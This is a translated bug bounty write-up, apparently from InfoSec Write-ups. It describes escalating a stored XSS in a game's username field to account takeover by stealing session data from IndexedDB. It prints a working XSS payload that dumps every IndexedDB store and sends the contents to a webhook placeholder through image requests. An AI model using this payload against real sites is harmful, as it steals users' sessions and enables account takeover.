<html>
<head>
<title>Stored XSS to Account Takeover : Going beyond document.cookie | Stealing Session Data from IndexedDB</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">存储的XSS到帐户接管:超越document.cookie |从IndexedDB窃取会话数据</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/stored-xss-to-account-takeover-going-beyond-document-cookie-970e42362f43?source=collection_archive---------0-----------------------#2022-08-02">https://infosecwriteups.com/stored-xss-to-account-takeover-going-beyond-document-cookie-970e42362f43?source=collection_archive---------0-----------------------#2022-08-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/799d094e4d55811a499577e7216656c9.png" data-original-src="https://miro.medium.com/v2/resize:fit:882/format:webp/1*aGbzrwjMJeMqe3wkaDeCWw.png"/></div></figure><p id="63a1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">简介</strong></p><p id="ef7f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi ks translated"><span class="l kt ku kv bm kw kx ky kz la di"> H </span>我是赛义德·穆希菲克·哈桑·塔辛，又名<a class="ae lb" href="https://twitter.com/SMHTahsin33" rel="noopener ugc nofollow" target="_blank"> SMHTahsin33 </a>，来自孟加拉国的18岁网络安全爱好者。我对信息安全感兴趣是因为好奇，并且我在空闲时间做bug奖金。在这个部门工作了大约两年半。</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><p id="87f8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">进入目标</strong></p><p id="08c3" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">让我们深入主要的web应用程序。我们的目标是一款类似社交网络应用的游戏，它提供类似虚拟现实的功能，可以在特定的世界/空间中漫游并与其他人一起游戏。一个空间一次可以容纳15个用户。</p><p id="7469" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">主要问题</strong></p><p id="5265" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">用户名容易受到存储的XSS的攻击，并且没有任何字符限制。当用户在空间A中添加任何资产(如图像、视频)时，屏幕顶部会弹出一个通知，提示说:“用户A刚刚向该空间添加了一个视频。你看看！”。名称的反射是易受攻击的反射点，当添加任何资产时，由于通知的出现，名称中的脚本会被执行。</p><figure class="lk ll lm ln gt jr gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/9d1acc964806e6c07ef45699caa91104.png" data-original-src="https://miro.medium.com/v2/resize:fit:834/format:webp/1*YckhBqVc2gDsS89tTLcy4w.jpeg"/></div></figure><p id="b8ea" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">混乱</strong></p><p id="e8ec" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我的第一个基本有效负载是<script> alert() </script>，它是反射的，但没有被执行，因为输入被添加到<strong class="jw ir"> innerHtml </strong>中，通过javascript动态添加。但是只使用&lt;img src = x on error = alert(document . cookie)&gt;就可以弹出一个窗口。但是…</p><figure class="lk ll lm ln gt jr gh gi paragraph-image"><div class="gh gi lo"><img src="../Images/222062440e63717d6f14a21d12c69ad5.png" data-original-src="https://miro.medium.com/v2/resize:fit:950/format:webp/1*0O7hnrXr08tdmFcTNYDpyQ.png"/></div></figure><p id="8bfb" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">如您所见，这些是弹出的cookies，我可以肯定地说这些不是用于会话识别目的的东西。</p><p id="ad1c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">调查<br/> </strong> <br/>那么Web应用程序是如何识别哪个用户登录的呢？那么让我们来讨论会话信息通常存储在哪里？</p><p id="58c4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">最常见的答案是在饼干里。但是没有，正如你所看到的，他们没有使用cookies来保存用户会话。另一个常用的存储是浏览器的本地存储，可以通过<strong class="jw ir"> window.localStorage </strong>和<strong class="jw ir"> JSON.stringify </strong>轻松访问:</p><figure class="lk ll lm ln gt jr gh gi paragraph-image"><div class="gh gi lp"><img src="../Images/f33fc3102f3fbbc8a25a77871d28b0bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:960/format:webp/1*BBg3_wmdhGBEBlW_fOVt-g.png"/></div></figure><p id="65ad" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">但是在我的目标中，他们也没有使用本地存储，而是使用<a class="ae lb" href="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API" rel="noopener ugc nofollow" target="_blank"> <strong class="jw ir"> IndexedDB </strong> </a>来保存用户的会话信息。让我们先来了解一下IndexedDB 然后:</p><blockquote class="lq lr ls"><p id="3d12" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated"><strong class="jw ir"> IndexedDB </strong>是一个低级API，用于客户端存储大量结构化数据，包括文件/blob。这个API使用索引来实现对这些数据的高性能搜索。虽然<a class="ae lb" href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API" rel="noopener ugc nofollow" target="_blank">网络存储</a>对于存储少量数据很有用，但是对于存储大量结构化数据就没那么有用了。<strong class="jw ir"> IndexedDB </strong>提供了解决方案。<br/> <strong class="jw ir"> IndexedDB </strong>是内置在浏览器中的数据库，比<code class="fe lx ly lz ma b"><strong class="jw ir">localStorage</strong></code>强大得多。</p><p id="2750" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated">通过键、多种键类型存储几乎任何类型的值。</p><p id="1a9c" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated">支持可靠性事务。</p><p id="6bf2" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated">支持关键字范围查询和索引。</p><p id="5a29" class="ju jv lt jw b jx jy jz ka kb kc kd ke lu kg kh ki lv kk kl km lw ko kp kq kr ij bi translated">可以存储比<code class="fe lx ly lz ma b"><strong class="jw ir">localStorage</strong></code>大得多的数据量。</p></blockquote><p id="4827" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">有效载荷制作</strong></p><p id="832f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">所以当我确认他们使用了浏览器的<strong class="jw ir">【应用】</strong>标签中的<strong class="jw ir"> IndexedDB </strong>。</p><figure class="lk ll lm ln gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/3f4dfb20fa5e58ca3974813bb548c453.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8Z_zGQZc4YZRCZIUbw6pcg.png"/></div></div></figure><p id="8835" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我不得不阅读文档来更多地了解它，在尝试了很多之后，我无法使用JS转储任何数据(这是当你没有足够的开发经验时会发生的事情)。</p><p id="80db" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">然后花更多的时间寻找从索引中转储数据的方法，我偶然发现了OWASP的这个网页:</p><div class="mg mh gp gr mi mj"><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage" rel="noopener  ugc nofollow" target="_blank"><div class="mk ab fo"><div class="ml ab mm cl cj mn"><h2 class="bd ir gy z fp mo fr fs mp fu fw ip bi translated">WSTG-4.2版</h2><div class="mq l"><h3 class="bd b gy z fp mo fr fs mp fu fw dk translated">WSTG-OWASP基金会主网站上的4.2版。OWASP是一个非营利基金会，致力于改善…</h3></div><div class="mr l"><p class="bd b dl z fp mo fr fs mp fu fw dk translated">owasp.org</p></div></div><div class="ms l"><div class="mt l mu mv mw ms mx js mj"/></div></div></a></div><p id="4730" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这里他们提供了所有测试浏览器存储的方法，我在<strong class="jw ir">WSTG 4.2版</strong>中找到了这段代码</p><p id="0483" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">打印<strong class="jw ir">索引的所有内容DB: </strong></p><pre class="lk ll lm ln gt my ma mz na aw nb bi"><span id="c440" class="nc nd iq ma b gy ne nf l ng nh">const dumpIndexedDB = dbName =&gt; {<br/>  const DB_VERSION = 1;<br/>  const req = indexedDB.open(dbName, DB_VERSION);<br/>  req.onsuccess = function() {<br/>    const db = req.result;<br/>    const objectStoreNames = db.objectStoreNames || [];</span><span id="7067" class="nc nd iq ma b gy ni nf l ng nh">    console.log(`[*] Database: ${dbName}`);</span><span id="541a" class="nc nd iq ma b gy ni nf l ng nh">    Array.from(objectStoreNames).forEach(storeName =&gt; {<br/>      const txn = db.transaction(storeName, 'readonly');<br/>      const objectStore = txn.objectStore(storeName);</span><span id="0169" class="nc nd iq ma b gy ni nf l ng nh">      console.log(`\t[+] ObjectStore: ${storeName}`);</span><span id="ff24" class="nc nd iq ma b gy ni nf l ng nh">      // Print all entries in objectStore with name `storeName`<br/>      objectStore.getAll().onsuccess = event =&gt; {<br/>        const items = event.target.result || [];<br/>        items.forEach(item =&gt; console.log(`\t\t[-] `, item));<br/>      };<br/>    });<br/>  };<br/>};</span><span id="872f" class="nc nd iq ma b gy ni nf l ng nh">indexedDB.databases().then(dbs =&gt; dbs.forEach(db =&gt; dumpIndexedDB(db.name)));</span></pre><p id="ec04" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当我把它粘贴到控制台上时，令我惊讶的是它居然成功了:)</p><figure class="lk ll lm ln gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nj"><img src="../Images/3896922d23bedb91d11274371b61c85d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BDN_Xk6x6pMquXMGCJ-NnQ.png"/></div></div></figure><p id="89a7" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">但是我必须把它注入到错误事件处理程序中，这个太大了，而且有空格，看起来很乱。然后我使用<a class="ae lb" href="https://www.toptal.com/developers/javascript-minifier" rel="noopener ugc nofollow" target="_blank"> <strong class="jw ir"> JS Minifier </strong> </a>将代码缩减成这样，并使空格不成问题，我将整个代码修改成一个函数:</p><pre class="lk ll lm ln gt my ma mz na aw nb bi"><span id="69c1" class="nc nd iq ma b gy ne nf l ng nh">(function(){const dumpIndexedDB=a=&gt;{let b=indexedDB.open(a,1);b.onsuccess=function(){let c=b.result,d=c.objectStoreNames||[];console.log(`[*] Database: ${a}`),Array.from(d).forEach(a=&gt;{let b=c.transaction(a,"readonly"),d=b.objectStore(a);console.log(`	[+] ObjectStore: ${a}`),d.getAll().onsuccess=a=&gt;{let b=a.target.result||[];b.forEach(a=&gt;console.log("\\t\\t[-] ",a))}})}};indexedDB.databases().then(a=&gt;a.forEach(a=&gt;dumpIndexedDB(a.name)))})()</span></pre><p id="5c5d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">数据泄露</strong></p><p id="7df7" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这样做很好，剩下的事情就是将转储的数据过滤到我自己的服务器上。为此，有效载荷需要更多的修改，正如我之前所说的，我之前没有任何JS经验，我最终ping了<a class="ae lb" href="https://twitter.com/Rayhan0x01" rel="noopener ugc nofollow" target="_blank"> <strong class="jw ir"> Rayhan Ahmed </strong> </a>兄弟，多亏了他，他为我修改了有效载荷，这对于数据渗透来说是完美的:</p><pre class="lk ll lm ln gt my ma mz na aw nb bi"><span id="0d66" class="nc nd iq ma b gy ne nf l ng nh">indexedDB.databases().then((e=&gt;e.forEach((e=&gt;(e=&gt;{let o=indexedDB.open(e,1);o.onsuccess=function(){let t=o.result,n=t.objectStoreNames||[];(new Image).src='WEB_HOOK?exfil=database:'+encodeURIComponent(e),Array.from(n).forEach((e=&gt;{let o=t.transaction(e,'readonly').objectStore(e);console.log(`[+] ObjectStore:${e}`),o.getAll().onsuccess=e=&gt;{(e.target.result||[]).forEach((e=&gt;{(new Image).src="WEB_HOOK?exfil=table:'+JSON.stringify(e)}))}}))}})(e.name)))));</span></pre><p id="b34b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我只是用我的<strong class="jw ir"> Webhook URL </strong>替换了<strong class="jw ir"> WEB_HOOK </strong>，并再次注入了有效载荷。最终有效载荷:</p><pre class="lk ll lm ln gt my ma mz na aw nb bi"><span id="ae99" class="nc nd iq ma b gy ne nf l ng nh">&lt;img src=x onerror="(function(){indexedDB.databases().then((e=&gt;e.forEach((e=&gt;(e=&gt;{let o=indexedDB.open(e,1);o.onsuccess=function(){let t=o.result,n=t.objectStoreNames||[];(new Image).src='WEB_HOOK?exfil=database:'+encodeURIComponent(e),Array.from(n).forEach((e=&gt;{let o=t.transaction(e,'readonly').objectStore(e);console.log(`[+] ObjectStore:${e}`),o.getAll().onsuccess=e=&gt;{(e.target.result||[]).forEach((e=&gt;{(new Image).src='WEB_HOOK?exfil=table:'+JSON.stringify(e)}))}}))}})(e.name)))))})()"&gt;</span></pre><p id="9e0c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当我再次复制这些步骤时，通知在每个用户的浏览器中弹出，有效负载被执行，导致他们的会话被记录到我的<strong class="jw ir"> Webhook </strong>。您还可以使用任何其他<strong class="jw ir">带外服务</strong>，包括您的<strong class="jw ir"> VPS </strong>进行数据渗透:</p><figure class="lk ll lm ln gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nk"><img src="../Images/cd48e678ba468766518cf76bd82cecea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*h_ym0O9iTmVbt5hZEV127A.png"/></div></div></figure><p id="8e6f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">成功窃取了受害者的会话，然后我所要做的就是复制并粘贴它，使用<a class="ae lb" href="https://chrome.google.com/webstore/detail/indexeddbedit/npjecebdjnmlolggnoajngnlodhgpfac?hl=en-GB" rel="noopener ugc nofollow" target="_blank"><strong class="jw ir">IndexedDbEdit</strong></a><strong class="jw ir"/>chrome扩展替换我自己的会话信息:</p><figure class="lk ll lm ln gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nl"><img src="../Images/3450988a7d4dfb4b9d9e021050cc6160.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-QPuceWCU42KnO9Wd6p3fg.png"/></div></div></figure><p id="6e22" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">点击保存图标后，浏览器重新加载，我成功地进入了受害者的仪表板</p><figure class="lk ll lm ln gt jr"><div class="bz fp l di"><div class="nm nn l"/></div></figure><p id="054a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">感谢阅读。希望你喜欢看这篇文章，不要忘记分享！</p><p id="575b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">再见！</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><p id="18aa" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">来自Infosec的报道:Infosec上每天都有很多内容，很难跟上。 <a class="ae lb" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="jw ir"> <em class="lt">加入我们的每周简讯</em> </strong> </a> <em class="lt">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>